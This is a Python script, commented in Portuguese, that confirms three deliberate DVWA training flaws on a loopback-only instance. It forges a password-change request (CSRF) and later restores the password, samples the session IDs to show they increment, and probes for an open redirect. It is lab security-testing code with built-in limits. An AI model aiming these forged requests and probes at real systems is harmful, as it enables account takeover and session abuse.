"""Confirmação DAST dirigida em uma instância descartável da DVWA em loopback."""

import argparse
from http.cookiejar import CookieJar
import json
import os
import re
import secrets
import urllib.error
import urllib.parse
import urllib.request
from getpass import getpass
from pathlib import Path

ROTA_CSRF = "/vulnerabilities/csrf/"
ROTA_IDS = "/vulnerabilities/weak_id/"
TOKEN = re.compile(r'''name=["']user_token["'][^>]*value=["']([^"']+)["']''')


class SemRedirecionamento(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def cliente(cookies):
    return urllib.request.build_opener(
        urllib.request.ProxyHandler({}),
        urllib.request.HTTPCookieProcessor(cookies),
        SemRedirecionamento(),
    )


def http(opener, base, rota, data=None, referer=None):
    req = urllib.request.Request(base + rota,
        data=urllib.parse.urlencode(data).encode() if data else None,
        headers={"Referer": referer} if referer else {})
    try:
        response = opener.open(req, timeout=8)
    except urllib.error.HTTPError as err:
        response = err
    with response:
        return response.code, response.headers, response.read().decode("utf-8", "replace")


def login(base, usuario, senha):
    cookies = CookieJar()
    navegador = cliente(cookies)
    _, _, pagina = http(navegador, base, "/login.php")
    token = TOKEN.search(pagina)
    if not token:
        return navegador, cookies, False
    code, cabe, _ = http(navegador, base, "/login.php", {
        "username": usuario, "password": senha, "Login": "Login",
        "user_token": token.group(1),
    })
    autenticado = code in (302, 303) and cabe.get("Location", "").endswith("index.php")
    return navegador, cookies, autenticado


def csrf(base, usuario, senha, autenticado):
    nova = secrets.token_hex(12)
    referer_teste = "http://127.0.0.2:18081/controle"
    forjar = ROTA_CSRF + "?" + urllib.parse.urlencode({
        "password_new": nova, "password_conf": nova, "Change": "Change"
    })
    anonimo = cliente(CookieJar())
    code_controle, cab_controle, _ = http(anonimo, base, forjar, referer=referer_teste)
    _, _, pagina = http(autenticado, base, ROTA_CSRF)
    code, _, body = http(autenticado, base, forjar, referer=referer_teste)
    _, _, novo_funciona = login(base, usuario, nova)
    _, _, antigo_funciona = login(base, usuario, senha)
    controle_redireciona = (
        code_controle in (302, 303) and cab_controle.get("Location", "").endswith("login.php")
    )
    confirmada = novo_funciona and not antigo_funciona and controle_redireciona
    restaurada = None
    if novo_funciona:
        restore = ROTA_CSRF + "?" + urllib.parse.urlencode({
            "password_new": senha, "password_conf": senha, "Change": "Change"
        })
        http(autenticado, base, restore, referer=base + ROTA_CSRF)
        restaurada = login(base, usuario, senha)[2]
    return {
        "status": "confirmada" if confirmada else "inconclusiva",
        "rota": ROTA_CSRF, "metodo": "GET", "referer_distinto": referer_teste,
        "codigo_sem_sessao": code_controle, "sem_sessao_redirecionou_login": controle_redireciona,
        "formulario_com_user_token": bool(TOKEN.search(pagina)),
        "codigo_sessao_autenticada": code,
        "resposta_indicou_alteracao": "Password Changed" in body,
        "login_com_nova_senha": novo_funciona, "login_com_senha_anterior": antigo_funciona,
        "senha_restaurada": restaurada,
    }


def ids_sessao(base, autenticado, cookies):
    amostras = []
    for _ in range(12):
        code, _, _ = http(autenticado, base, ROTA_IDS, {"Generate": "Generate"})
        cookie = next((c for c in cookies if c.name == "dvwaSession"), None)
        amostras.append({"http": code, "id_treinamento": int(cookie.value) if
                         cookie is not None and cookie.value.isdecimal() else None})
    sequencia = [a["id_treinamento"] for a in amostras]
    sucessivos = (None not in sequencia and all(
        atual == anterior + 1 for anterior, atual in zip(sequencia, sequencia[1:])
    ))
    return {"status": "confirmada" if sucessivos else "inconclusiva",
            "rota": ROTA_IDS, "amostras": amostras, "incremento_unitario": sucessivos,
            "cookie_teste": "dvwaSession"}


def redirecionamento(base, autenticado):
    alvo = "http://127.0.0.2:18081/controle"
    check = {}
    for nome in ("open_redirect", "redirect"):
        rota = f"/vulnerabilities/{nome}/"
        marcador = "redirect" if nome == "open_redirect" else "url"
        controle = rota + "?" + urllib.parse.urlencode({marcador: alvo})
        code, cab, body = http(autenticado, base, controle)
        check[rota] = {"http": code, "destino_de_controle_no_location":
                       cab.get("Location") == alvo}
    confirmada = any(r["destino_de_controle_no_location"] and 300 <= r["http"] < 400
                     for r in check.values())
    return {"status": "confirmada" if confirmada else "inconclusiva",
            "sondas_de_rota": check, "seguiu_redirecionamento": False}


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base", required=True, help="URL http://127.0.0.1:PORTA da DVWA descartável")
    parser.add_argument("--usuario", default="admin")
    parser.add_argument("--out", type=Path, required=True)
    parser.add_argument("--configuracao", required=True, help="Imagem/digest, servidor HTTP e nível")
    args = parser.parse_args()
    base = args.base.rstrip("/")
    if not re.fullmatch(r"http://127\.0\.0\.1:\d+", base):
        parser.error("Use uma instância HTTP descartável vinculada a 127.0.0.1.")
    senha = os.environ.get("DVWA_LAB_PASSWORD") or getpass("Senha da DVWA descartável: ")
    navegador, cookies, autenticado = login(base, args.usuario, senha)
    if not autenticado:
        parser.error("Autenticação do laboratório falhou. Confira o endereço e a conta.")
    nivel = next((c.value for c in cookies if c.name == "security"), None)
    if nivel != "low":
        parser.error(f"O protocolo exige nível low. Cookie de nível observado: {nivel!r}.")
    evidencias = {"configuracao": args.configuracao, "base": base, "nivel": nivel,
        "casos": {
            "dvwa-csrf": csrf(base, args.usuario, senha, navegador),
            "dvwa-weak-session-ids": ids_sessao(base, navegador, cookies),
            "dvwa-open-http-redirect": redirecionamento(base, navegador),
        }}
    args.out.parent.mkdir(parents=True, exist_ok=True)
    args.out.write_text(json.dumps(evidencias, indent=2, ensure_ascii=False) + "\n",
                        encoding="utf-8")
    for vid, evidencia in evidencias["casos"].items():
        print(f"{vid}: {evidencia['status']}")


if __name__ == "__main__":
    main()
